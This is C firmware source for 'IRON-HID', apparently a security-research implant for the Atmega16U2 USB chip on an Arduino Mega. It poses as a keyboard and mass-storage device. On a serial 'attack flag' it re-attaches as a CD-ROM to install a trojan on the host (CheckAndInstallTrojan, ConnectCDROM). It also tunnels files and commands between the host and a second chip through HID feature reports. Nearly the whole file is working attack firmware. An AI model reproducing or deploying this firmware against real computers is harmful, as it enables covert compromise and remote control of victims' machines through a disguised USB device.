/*
      IRON-HID Keyboard Firmware for Atmega16U2 in Arduino Mega 2560       
                    Copyright (C) 2016 Seunghun Han 
         at National Security Research Institute of South Korea
*/

/*
Copyright (c) 2016 Seunghun Han at NSR of South Kora

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
*/
  
/*
             LUFA Library
     Copyright (C) Dean Camera, 2010.
              
  dean [at] fourwalledcubicle [dot] com
      www.fourwalledcubicle.com
*/

/*
  Copyright 2010  Dean Camera (dean [at] fourwalledcubicle [dot] com)
  Copyright 2010  Matthias Hullin (lufa [at] matthias [dot] hullin [dot] net)

  Permission to use, copy, modify, distribute, and sell this 
  software and its documentation for any purpose is hereby granted
  without fee, provided that the above copyright notice appear in 
  all copies and that both that the copyright notice and this
  permission notice and warranty disclaimer appear in supporting 
  documentation, and that the name of the author not be used in 
  advertising or publicity pertaining to distribution of the 
  software without specific, written prior permission.

  The author disclaim all warranties with regard to this
  software, including all implied warranties of merchantability
  and fitness.  In no event shall the author be liable for any
  special, indirect or consequential damages or any damages
  whatsoever resulting from loss of use, data or profits, whether
  in an action of contract, negligence or other tortious action,
  arising out of or in connection with the use or performance of
  this software.
*/

#include "KeyboardFirmware.h"
#include <avr/sleep.h>
#include <avr/power.h>
#include <avr/wdt.h>
	
// Buffer to hold the previously generated Keyboard HID report, for comparison purposes inside the HID class driver.
uint8_t PrevKeyboardHIDReportBuffer[sizeof(USB_KeyboardReport_Data_t)];

// Buffer to hold the previously generated Keyboard HID report, for comparison purposes inside the HID class driver.
uint8_t PrevUserHIDReportBuffer[sizeof(USB_KeyboardReport_Data_t)];

/** 
 * 	LUFA HID Class driver interface configuration and state information. This structure is
 *  passed to all HID Class driver functions, so that multiple instances of the same class
 *  within a device can be differentiated from one another.
 */
USB_ClassInfo_HID_Device_t Keyboard_HID_Interface =
 	{
		.Config =
			{
				.InterfaceNumber              = KEYBOARD_IFNUM,

				.ReportINEndpointNumber       = KEYBOARD_EPNUM,
				.ReportINEndpointSize         = KEYBOARD_EPSIZE,
				.ReportINEndpointDoubleBank   = false,

				.PrevReportINBuffer           = PrevKeyboardHIDReportBuffer,
				.PrevReportINBufferSize       = sizeof(PrevKeyboardHIDReportBuffer),
			},
    };

/**
 *	Interface for communication between host and keyboard.
 */
USB_ClassInfo_HID_Device_t User_HID_Interface =
 	{
		.Config =
			{
				.InterfaceNumber              = USER_IFNUM,

				.ReportINEndpointNumber       = USER_EPNUM,
				.ReportINEndpointSize         = USER_EPSIZE,
				.ReportINEndpointDoubleBank   = false,

				.PrevReportINBuffer           = PrevUserHIDReportBuffer,
				.PrevReportINBufferSize       = sizeof(PrevUserHIDReportBuffer),
			},
    };

/**
 *	LUFA Mass Storage Class driver interface configuration and state information. This structure is
 *  passed to all Mass Storage Class driver functions, so that multiple instances of the same class
 *  within a device can be differentiated from one another.
 */
USB_ClassInfo_MS_Device_t Disk_MS_Interface =
	{
		.Config =
			{
				.InterfaceNumber           = MASS_STORAGE_IFNUM,

				.DataINEndpointNumber      = MASS_STORAGE_IN_EPNUM,
				.DataINEndpointSize        = MASS_STORAGE_IO_EPSIZE,
				.DataINEndpointDoubleBank  = false,

				.DataOUTEndpointNumber     = MASS_STORAGE_OUT_EPNUM,
				.DataOUTEndpointSize       = MASS_STORAGE_IO_EPSIZE,
				.DataOUTEndpointDoubleBank = false,

				.TotalLUNs                 = TOTAL_LUNS,
			},
	};

// USB Report Buffer
USB_KeyboardReport_Data_t g_stKeyboardReport;

// Attack Mode
volatile uint8_t g_bAttackMode = 0;
volatile uint8_t g_bGetFeatureRecved = 0;

/** 
 * 	Main program entry point. This routine contains the overall program flow, including initial
 *  setup of all components and the main program loop.
 */
int main(void)
{
	int iLoopCount = 0;

	SetupHardware();
	LEDs_SetAllLEDs(LEDMASK_USB_NOTREADY);

	sei();

	// Waiting for stable state
	_delay_ms(2000);

	for (;;)
	{
		MS_Device_USBTask(&Disk_MS_Interface);
		HID_Device_USBTask(&Keyboard_HID_Interface);
		HID_Device_USBTask(&User_HID_Interface);
		USB_USBTask();

		iLoopCount++;
		
		// Check the attack flag from Atmega2560
		if (iLoopCount % 10000 == 0)
		{
			CheckAndInstallTrojan();
			
		}
	}
}

/** 
 *	Configures the board hardware and chip peripherals. 
 */
void SetupHardware(void)
{
	// Disable watchdog if enabled by bootloader/fuses 
	MCUSR &= ~(1 << WDRF);
	wdt_disable();

	// Disable clock division 
	clock_prescale_set(clock_div_1);

	// Hardware Initialization 
	LEDs_Init();
	Serial_Init(115200, true);
	USB_Init();

	// Start the flush timer so that overflows occur rapidly to push received bytes to the USB interface 
	TCCR0B = (1 << CS02);
	
	// Pull target /RESET line high
	AVR_RESET_LINE_PORT |= AVR_RESET_LINE_MASK;
	AVR_RESET_LINE_DDR  |= AVR_RESET_LINE_MASK;

	// Control power
	//power_timer1_disable();
	//power_spi_disable();
}

/** 
 *	Event handler for the library USB Connection event. 
 */
void EVENT_USB_Device_Connect(void)
{
	LEDs_SetAllLEDs(LEDMASK_USB_ENUMERATING);
}

/** 
 *	Event handler for the library USB Disconnection event. 
 */
void EVENT_USB_Device_Disconnect(void)
{
	LEDs_SetAllLEDs(LEDMASK_USB_NOTREADY);
}

/** 
 *	Event handler for the library USB Configuration Changed event. 
 */
void EVENT_USB_Device_ConfigurationChanged(void)
{
	if (!(MS_Device_ConfigureEndpoints(&Disk_MS_Interface)))
	  LEDs_SetAllLEDs(LEDMASK_USB_ERROR);

	if (!(HID_Device_ConfigureEndpoints(&Keyboard_HID_Interface)))
	  LEDs_SetAllLEDs(LEDMASK_USB_ERROR);

	if (!(HID_Device_ConfigureEndpoints(&User_HID_Interface)))
	  LEDs_SetAllLEDs(LEDMASK_USB_ERROR);

	USB_Device_EnableSOFEvents();
}

/** 
 * 	Handle control transfer.
 */
bool Process_USB_Device_ControlRequest(void)
{
	int i;
	int j;
	char vcBuffer[FILE_CHUNK_SIZE + 1];
	uint16_t iReportSize;
	uint8_t  iReportID;
	uint8_t  iReportType;
	uint16_t iRemainSize;
	uint16_t iTemp;

	if (USB_ControlRequest.wIndex != USER_IFNUM)
	{
		return false;
	}

	if (((USB_ControlRequest.bmRequestType & CONTROL_REQTYPE_TYPE) == REQTYPE_CLASS) && 
		((USB_ControlRequest.bmRequestType & CONTROL_REQTYPE_RECIPIENT) == REQREC_INTERFACE))
	{
		iReportSize = USB_ControlRequest.wLength;
		iReportID   = (USB_ControlRequest.wValue & 0xFF);
		iReportType = (USB_ControlRequest.wValue >> 8) - 1;
		
		if ((USB_ControlRequest.bmRequestType & CONTROL_REQTYPE_DIRECTION) == REQDIR_HOSTTODEVICE)
		{
			Endpoint_ClearSETUP();
			iRemainSize = iReportSize;

			for (i = 0 ; i < (iReportSize + sizeof(vcBuffer) - 1) / sizeof(vcBuffer)  ; i++)
			{
				iTemp = sizeof(vcBuffer);
				if (iRemainSize < sizeof(vcBuffer))
				{
					iTemp = iRemainSize;
				}
				Endpoint_Read_Control_Stream_LE(vcBuffer, iTemp);

				Serial_TxString("F;;");
				j = 0;
				
				// Send Except Report ID
				for (j = 0 ; j < iTemp - 1; j++)
				{
					Serial_TxByte(vcBuffer[j + 1]);
				}
				Serial_TxString(";");
				
				iRemainSize -= iTemp;
			}
			Endpoint_ClearStatusStage();
		}
		else
		{
			memset(vcBuffer, 0x00, sizeof(vcBuffer));
			// Send CMD Request to Remote
			Serial_TxString("C;;;");
			Endpoint_ClearSETUP();
			Endpoint_SelectEndpoint(ENDPOINT_CONTROLEP);
			for (i = 0 ; i < FILE_CHUNK_SIZE ; i++)
			{
				while (!Serial_IsCharReceived())
				{
					;
				}
				vcBuffer[i] = Serial_RxByte();
			}
			// Send to Host
			Endpoint_Write_Control_Stream_LE(vcBuffer, i);
			
			Endpoint_ClearOUT();

			if (g_bAttackMode == 1)
			{
				g_bGetFeatureRecved = 1;
			}
		}
		return true;
	}
	else
	{
	}
	return false;
}

/** 
 *	Event handler for the library USB Unhandled Control Request event. 
 */
void EVENT_USB_Device_UnhandledControlRequest(void)
{
	MS_Device_ProcessControlRequest(&Disk_MS_Interface);
	HID_Device_ProcessControlRequest(&Keyboard_HID_Interface);
	
	Process_USB_Device_ControlRequest();
}

/** 
 *	Mass Storage class driver callback function the reception of SCSI commands from the host, which must be processed.
 *
 *  \param[in] MSInterfaceInfo  Pointer to the Mass Storage class interface configuration structure being referenced
 */
bool CALLBACK_MS_Device_SCSICommandReceived(USB_ClassInfo_MS_Device_t* const MSInterfaceInfo)
{
	bool CommandSuccess;
	
	LEDs_SetAllLEDs(LEDMASK_USB_BUSY);
	CommandSuccess = SCSI_DecodeSCSICommand(MSInterfaceInfo);
	LEDs_SetAllLEDs(LEDMASK_USB_READY);
	
	return CommandSuccess;
}

/** 
 *	Event handler for the USB Device Start Of Frame event. 
 */
void EVENT_USB_Device_StartOfFrame(void)
{
    HID_Device_MillisecondElapsed(&Keyboard_HID_Interface);
    HID_Device_MillisecondElapsed(&User_HID_Interface);
}

/** 
 *	HID class driver callback function for the creation of HID reports to the host.
 *
 *  \param[in]     HIDInterfaceInfo  Pointer to the HID class interface configuration structure being referenced
 *  \param[in,out] ReportID    Report ID requested by the host if non-zero, otherwise callback should set to the generated report ID
 *  \param[in]     ReportType  Type of the report to create, either REPORT_ITEM_TYPE_In or REPORT_ITEM_TYPE_Feature
 *  \param[out]    ReportData  Pointer to a buffer where the created report should be stored
 *  \param[out]    ReportSize  Number of bytes written in the report (or zero if no report is to be sent
 *
 *  \return Boolean true to force the sending of the report, false to let the library determine if it needs to be sent
 */
bool CALLBACK_HID_Device_CreateHIDReport(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
                                         uint8_t* const ReportID,
                                         const uint8_t ReportType,
                                         void* ReportData,
                                         uint16_t* const ReportSize)
{
#ifdef MATIAS_LAPTOP_PRO
	// If wireless type(bluetooth) keyboard, key data is transferred via wireless
	*ReportSize = 0;
	return false;
#endif

	USB_KeyboardReport_Data_t* KeyboardReport = (USB_KeyboardReport_Data_t*)ReportData;
	int i;

	ProcessKeyData();

	KeyboardReport->Modifier = g_stKeyboardReport.Modifier;
	for (i = 0 ; i < 6 ; i++)
	{
		KeyboardReport->KeyCode[i] = g_stKeyboardReport.KeyCode[i];
	}
	*ReportSize = sizeof(USB_KeyboardReport_Data_t);
	return true;
}

/** 
 *	HID class driver callback function for the processing of HID reports from the host.
 *
 *  \param[in] HIDInterfaceInfo  Pointer to the HID class interface configuration structure being referenced
 *  \param[in] ReportID    Report ID of the received report from the host
 *  \param[in] ReportType  The type of report that the host has sent, either REPORT_ITEM_TYPE_Out or REPORT_ITEM_TYPE_Feature
 *  \param[in] ReportData  Pointer to a buffer where the created report has been stored
 *  \param[in] ReportSize  Size in bytes of the received HID report
 */
void CALLBACK_HID_Device_ProcessHIDReport(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
                                          const uint8_t ReportID,
                                          const uint8_t ReportType,
                                          const void* ReportData,
                                          const uint16_t ReportSize)
{
	uint8_t* LEDReport = (uint8_t*)ReportData;
	
	//Serial_TxString("D;;HID Proc;");
	// HID_KEYBOARD_LED_NUMLOCK 	: 0x01
	// HID_KEYBOARD_LED_CAPSLOCK	: 0x02
	// HID_KEYBOARD_LED_SCROLLLOCK	: 0x04
	// Send LED Status
	Serial_TxString("L;;");
	Serial_TxByte(*LEDReport);
	Serial_TxString(";");	
}


/** 
 *	ISR to manage the reception of data from the serial port, placing received bytes into a circular buffer
 *  for later transmission to the host.
 */
ISR(USART1_RX_vect, ISR_BLOCK)
{
	//uint8_t ReceivedByte = UDR1;
	
	//if (USB_DeviceState == DEVICE_STATE_Configured)
}

/**
 *	Request key data and Process key data.
 *
 *	USB report format: Modifier, Reserved, 6 Keys(Total 8 bytes)
 */
void ProcessKeyData()
{
	int i;

	cli();

	// Request key data
	Serial_TxString("K;;;");
	
	// Process key data
	for (i = 0 ; i < 8 ; i++)
	{
		while (!Serial_IsCharReceived())
		{
			;
		}

		switch(i)
		{
			case 0:
				g_stKeyboardReport.Modifier = Serial_RxByte();
				break;

			case 1:
				Serial_RxByte();
				break;

			default:
				g_stKeyboardReport.KeyCode[i - 2] = Serial_RxByte();
				break;
		}
	}

	sei();
}

/**
 *	Check the attack flag from the atmega2560 and mount CD-ROM to install the 
 *	trojan. 
 */
void CheckAndInstallTrojan()
{
	char cData;

	cli();

	// Get the attack flag
	Serial_TxString("A;;0;");

	while (!Serial_IsCharReceived())
	{
		;
	}

	cData = Serial_RxByte();
	sei();
	
	// Mount the CD-ROM	
	if (cData == 0x01)
	{
		ConnectCDROM();
	}
	else
	{
		// If attack mode is set and GetFeature is sent from the host PC, 
		// disconnect CD-ROM
		if ((g_bAttackMode == 1) && (g_bGetFeatureRecved == 1))
		{
			DisconnectCDROM();
		}
	}
}

/**
 *	Connect CD-ROM.
 */
void ConnectCDROM(void)
{
	USB_Detach();
	
	_delay_ms(100);
	g_bAttackMode = 1;

	USB_Attach();
}

/**
 *	Disconnect CD-ROM.
 */
void DisconnectCDROM(void)
{
	USB_Detach();
	
	_delay_ms(100);
	g_bAttackMode = 0;
	g_bGetFeatureRecved = 0;

	USB_Attach();
}

/**
 *	ISR of timer1 overflow.
 */
ISR(TIMER1_OVF_vect)
{
	//Serial.println("Timer1 Overrun!!!");
}

/**
 *	Sleep.
 */
void EnterSleep(void)
{
	set_sleep_mode(SLEEP_MODE_IDLE);
	//set_sleep_mode(SLEEP_MODE_PWR_SAVE);
	  
	sleep_enable();

	/* 
	 * Disable all of the unused peripherals. This will reduce power
	 * consumption further and, more importantly, some of these
	 * peripherals may generate interrupts that will wake our Arduino from
	 * sleep
	 */
	power_timer1_enable();
	SetupTimer();

	// Now enter sleep mode
	sleep_mode();

	// The program will continue from here after the timer timeout
	sleep_disable(); 

	// Re-enable the peripherals
	//power_all_enable();
	power_timer1_disable();
}

/**
 *	ISR of WDT overflow.
 */
ISR(WDT_vect)
{
	//Serial.println("WDT Overrun!!!");
}

/**
 *	Deep Sleep.
 */
void EnterDeepSleep(void)
{
	wdt_enable(WDTO_2S);
	
	// Enable Watchdog Interrupt
	WDTCSR |= _BV(WDIE);
	
	set_sleep_mode(SLEEP_MODE_PWR_DOWN);   
	sleep_enable();
	  
	// Now enter sleep mode 
	sleep_mode();
				
	// The program will continue from here after the WDT timeout
	
	sleep_disable(); 	
	wdt_disable();
	
	// Re-enable the peripherals
	//power_all_enable();
}

/**
 *	Setup timer.
 */
void SetupTimer()
{
	// Normal timer operation
	TCCR1A = 0x00; 

	// Clear the timer counter register
	TCNT1 = 0xFF00; 

	/* 
	 * Configure the prescaler(No prescailer), total 0.5ms
	 * 0x00 : Stop timer
	 * 0x01 : 1:1  -> 0.5ms
	 * 0x02 : 1:8  -> 4.09ms
	 * 0x03 : 1:64
	 * 0x04 : 1:256
	 * 0x05 : 1:1024
	 */
	TCCR1B = 0x02;

	// Enable the timer overlow interrupt
	TIMSK1 = 0x01;
}

/**
 *	My Simple ItoA.
 */
void MyItoA(char* pcBuffer, int iValue)
{
	int iTemp;
	int iIndex;
	char cTemp;
	int i;

	iTemp = iValue;
	if (iTemp == 0)
	{
		pcBuffer[0] = '0';
		pcBuffer[1] = '\0';
		return ;
	}

	iIndex = 0;
	while(iTemp != 0)
	{
		pcBuffer[iIndex] = iTemp % 10 + '0';
		iIndex++;

		iTemp = iTemp / 10;
	}

	pcBuffer[iIndex] = '\0';

	// Swap for printing
	for (i = 0 ; i < iIndex / 2 ; i++)
	{
		cTemp = pcBuffer[i];
		pcBuffer[i] = pcBuffer[iIndex - i - 1];
		pcBuffer[iIndex - i - 1] = cTemp;
	}
}
